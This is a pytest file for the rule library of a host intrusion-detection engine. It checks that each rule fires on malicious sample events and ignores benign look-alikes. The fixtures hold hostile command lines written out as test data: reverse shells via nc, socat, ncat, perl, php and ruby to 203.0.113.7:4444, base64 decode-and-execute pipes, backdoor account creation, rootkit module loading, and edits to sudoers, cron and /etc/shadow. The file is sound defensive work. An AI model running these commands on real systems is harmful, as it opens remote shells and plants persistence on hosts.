"""Per-rule positive/negative coverage for the shipped rule library.

Every rule under ``rules/`` must (a) have a test case here, (b) fire on an event
that represents the behavior it targets, and (c) stay silent on a benign
look-alike. The parametrization is driven by the *actually loaded* rules, so a
new rule file with no case fails ``test_every_rule_has_a_test_case`` — the
library can never grow an untested detection.
"""

from __future__ import annotations

from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from sentinel.detection.engine import DetectionEngine
from sentinel.detection.loader import load_rules
from sentinel.events import (
    Destination,
    Event,
    EventCategory,
    EventKind,
    EventMeta,
    EventOutcome,
    File,
    Host,
    Process,
    Source,
)

_RULES_DIR = Path(__file__).resolve().parent.parent / "rules"
RULES = load_rules(_RULES_DIR)
RULE_IDS = sorted(rule.id for rule in RULES)

BASE_TS = datetime(2026, 6, 22, 12, 0, 0, tzinfo=UTC)
_EID = "0" * 64

_AUTH = EventCategory.AUTHENTICATION
_PROC = EventCategory.PROCESS
_FILE = EventCategory.FILE
_NET = EventCategory.NETWORK


def ev(
    action: str,
    category: EventCategory,
    *,
    ip: str | None = None,
    port: int | None = None,
    user: str | None = None,
    dport: int | None = None,
    cmd: str | None = None,
    exe: str | None = None,
    fpath: str | None = None,
    fmode: str | None = None,
    fsize: int | None = None,
    ts: datetime | None = None,
) -> Event:
    """Build a minimal Event for rule testing."""
    return Event(
        timestamp=ts or BASE_TS,
        event=EventMeta(
            id=_EID,
            kind=EventKind.EVENT,
            category=category,
            action=action,
            outcome=EventOutcome.SUCCESS,
            severity=3,
        ),
        host=Host(name="host1"),
        source=Source(ip=ip, port=port, user=user),
        destination=Destination(port=dport),
        process=Process(command_line=cmd, executable=exe),
        file=File(path=fpath, mode=fmode, size=fsize) if fpath is not None else None,
        message="event",
    )


@dataclass(frozen=True)
class RuleCase:
    """Events that must fire a rule, and one benign event that must not."""

    positive: list[Event]
    negative: Event


# Five failed logins from one IP inside the window — the brute-force trigger.
_BRUTE = [
    ev("ssh_login_failed", _AUTH, ip="6.6.6.6", ts=BASE_TS + timedelta(seconds=i)) for i in range(5)
]

CASES: dict[str, RuleCase] = {
    "ssh-brute-force": RuleCase(
        positive=_BRUTE,
        negative=ev("ssh_login_failed", _AUTH, ip="6.6.6.6"),  # single attempt
    ),
    "ssh-root-login": RuleCase(
        positive=[ev("ssh_login_succeeded", _AUTH, user="root")],
        negative=ev("ssh_login_succeeded", _AUTH, user="alice"),
    ),
    "reverse-shell-process": RuleCase(
        positive=[ev("process_started", _PROC, cmd="nc -e /bin/sh 10.0.0.1 4444")],
        negative=ev("process_started", _PROC, cmd="cat /etc/hostname"),
    ),
    "shadow-file-modified": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/shadow")],
        negative=ev("file_modified", _FILE, fpath="/etc/hosts"),
    ),
    "passwd-file-modified": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/passwd")],
        negative=ev("file_modified", _FILE, fpath="/etc/group"),
    ),
    "sudoers-modified": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/sudoers.d/90-evil")],
        negative=ev("file_modified", _FILE, fpath="/etc/hosts"),
    ),
    "cron-persistence": RuleCase(
        positive=[ev("file_created", _FILE, fpath="/etc/cron.d/backdoor")],
        negative=ev("file_created", _FILE, fpath="/home/user/notes.txt"),
    ),
    "new-suid-binary": RuleCase(
        positive=[ev("file_created", _FILE, fpath="/usr/local/bin/x", fmode="4755")],
        negative=ev("file_created", _FILE, fpath="/usr/local/bin/x", fmode="0755"),
    ),
    "world-writable-sensitive": RuleCase(
        positive=[ev("file_modified", _FILE, fpath="/etc/app.conf", fmode="0666")],
        negative=ev("file_modified", _FILE, fpath="/etc/app.conf", fmode="0644"),
    ),
    "base64-execution": RuleCase(
        positive=[ev("process_started", _PROC, cmd="echo ZWNobyBoaQ== | base64 -d | sh")],
        negative=ev("process_started", _PROC, cmd="python3 /opt/app/main.py"),
    ),
    "account-creation": RuleCase(
        positive=[ev("process_started", _PROC, cmd="useradd -m -s /bin/bash backdoor")],
        negative=ev("process_started", _PROC, cmd="ls -la /home"),
    ),
    "kernel-module-load": RuleCase(
        positive=[ev("process_started", _PROC, cmd="insmod /tmp/rootkit.ko")],
        negative=ev("process_started", _PROC, cmd="lsmod"),
    ),
    "suspicious-tmp-exec": RuleCase(
        positive=[ev("process_started", _PROC, exe="/tmp/.hidden/payload")],
        negative=ev("process_started", _PROC, exe="/usr/bin/python3"),
    ),
    "new-listening-service": RuleCase(
        positive=[ev("network_listen_started", _NET, port=4444)],
        negative=ev("network_listen_started", _NET, port=443),
    ),
    "c2-beacon-port": RuleCase(
        positive=[ev("network_connection_opened", _NET, dport=4444)],
        negative=ev("network_connection_opened", _NET, dport=443),
    ),
    "log-tampering": RuleCase(
        positive=[ev("file_deleted", _FILE, fpath="/var/log/auth.log")],
        negative=ev("file_deleted", _FILE, fpath="/tmp/scratch"),
    ),
    "interactive-shell-spawn": RuleCase(
        positive=[ev("process_started", _PROC, cmd="bash -i")],
        negative=ev("process_started", _PROC, cmd="bash /opt/deploy.sh"),
    ),
}


def _fired_ids(engine: DetectionEngine, events: list[Event]) -> set[str]:
    fired: set[str] = set()
    for event in events:
        fired.update(d.rule_id for d in engine.evaluate(event))
    return fired


def test_rule_library_is_not_empty() -> None:
    assert len(RULES) >= 15  # the directive's minimum


@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_every_rule_has_a_test_case(rule_id: str) -> None:
    assert rule_id in CASES, f"rule {rule_id!r} has no positive/negative test case"


@pytest.mark.security
@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_rule_fires_on_positive(rule_id: str) -> None:
    fired = _fired_ids(DetectionEngine(RULES), CASES[rule_id].positive)
    assert rule_id in fired


@pytest.mark.security
@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_rule_silent_on_negative(rule_id: str) -> None:
    fired = _fired_ids(DetectionEngine(RULES), [CASES[rule_id].negative])
    assert rule_id not in fired


def _with_action(event: Event, action: str) -> Event:
    return event.model_copy(update={"event": event.event.model_copy(update={"action": action})})


@pytest.mark.parametrize("rule_id", RULE_IDS)
def test_process_rules_fire_once_per_process(rule_id: str) -> None:
    """A process rule fires on the start, never again on the stop.

    The process collector emits both lifecycle events with the same command line
    and executable but different `event.id`s, so a rule without an action guard
    alerted twice for every malicious process — a duplicate the alert dedup
    (keyed on rule + event id) cannot collapse.
    """
    starts = [e for e in CASES[rule_id].positive if e.event.action == "process_started"]
    stops = [_with_action(e, "process_stopped") for e in starts]
    assert rule_id not in _fired_ids(DetectionEngine(RULES), stops)


def test_world_writable_ignores_deleted_files() -> None:
    # The exposure ends when the file is gone; the deletion is not the finding.
    deleted = ev("file_deleted", _FILE, fpath="/etc/app.conf", fmode="0666")
    assert "world-writable-sensitive" not in _fired_ids(DetectionEngine(RULES), [deleted])


def _cmd(command_line: str, exe: str | None = None) -> Event:
    return ev("process_started", _PROC, cmd=command_line, exe=exe)


# Variants of each technique that slipped past the rules (detection review).
EVASIONS: list[tuple[str, Event]] = [
    ("interactive-shell-spawn", _cmd("bash -li")),
    ("interactive-shell-spawn", _cmd("bash -l -i")),
    ("interactive-shell-spawn", _cmd("[kworker] -i", exe="/usr/bin/bash")),  # exec -a
    ("reverse-shell-process", _cmd("bash -li")),
    ("reverse-shell-process", _cmd("socat tcp:203.0.113.7:4444 exec:'bash -li',pty,stderr")),
    ("reverse-shell-process", _cmd("ncat 203.0.113.7 4444 --exec /bin/sh")),
    ("reverse-shell-process", _cmd("nc -c /bin/sh 203.0.113.7 4444")),
    ("reverse-shell-process", _cmd("nc -nve /bin/sh 203.0.113.7 4444")),
    ("reverse-shell-process", _cmd("[kworker] -i", exe="/bin/sh")),
    (
        "reverse-shell-process",
        _cmd("perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,$a)'"),
    ),
    ("reverse-shell-process", _cmd("php -r '$s=fsockopen(\"203.0.113.7\",4444);'")),
    ("reverse-shell-process", _cmd("ruby -rsocket -e 'TCPSocket.open(\"h\",4444)'")),
    ("base64-execution", _cmd("base64 -di payload.b64")),
    ("base64-execution", _cmd("base64 --deco payload.b64")),
    ("base64-execution", _cmd("openssl base64 -d -in payload.b64")),
    ("base64-execution", _cmd('python3 -c \'exec(__import__("base64").b64decode("cHJp"))\'')),
    (
        "new-suid-binary",
        ev("file_attributes_modified", _FILE, fpath="/usr/local/bin/x", fmode="2755"),
    ),
    ("log-tampering", ev("file_modified", _FILE, fpath="/var/log/auth.log", fsize=0)),
    ("passwd-file-modified", ev("file_created", _FILE, fpath="/etc/passwd")),
]

# Benign look-alikes the widened patterns must still leave alone.
LOOK_ALIKES: list[tuple[str, Event]] = [
    ("interactive-shell-spawn", _cmd("bash -lc 'make test'")),
    ("interactive-shell-spawn", _cmd("sh -c 'sort -i data.txt'", exe="/bin/sh")),
    ("reverse-shell-process", _cmd("nc -zv db.internal 5432")),
    ("reverse-shell-process", _cmd("ncat --ssl -l 8443")),
    ("base64-execution", _cmd("base64 -w0 report.pdf")),
    ("new-suid-binary", ev("file_attributes_modified", _FILE, fpath="/tmp/x", fmode="1777")),
    ("log-tampering", ev("file_modified", _FILE, fpath="/var/log/auth.log", fsize=4096)),
    ("log-tampering", ev("file_deleted", _FILE, fpath="/var/logs-archive/old.gz")),
]


@pytest.mark.security
@pytest.mark.parametrize(("rule_id", "event"), EVASIONS)
def test_known_evasions_still_fire(rule_id: str, event: Event) -> None:
    assert rule_id in _fired_ids(DetectionEngine(RULES), [event])


@pytest.mark.parametrize(("rule_id", "event"), LOOK_ALIKES)
def test_look_alikes_stay_silent(rule_id: str, event: Event) -> None:
    assert rule_id not in _fired_ids(DetectionEngine(RULES), [event])


@pytest.mark.security
def test_no_rule_pattern_backtracks_on_hostile_command_lines() -> None:
    # Regression: `\bnc\b.*\s-e` was quadratic; "nc " repeated to the clip
    # length took up to 1 s (beyond the 100 ms timeout). Every library pattern
    # must decide such inputs in time — an incomplete evaluation fires the
    # rule, so a slow pattern would turn into noise.
    hostile = [
        "nc " * 3_300,
        "python " * 1_400,
        "bash -l" * 1_400,
        "base64 " * 1_400,
        "socat " * 1_600,
    ]
    engine = DetectionEngine(RULES)
    for command_line in hostile:
        engine.evaluate(_cmd(command_line[:10_000]))
    assert engine.stats["incomplete"] == 0
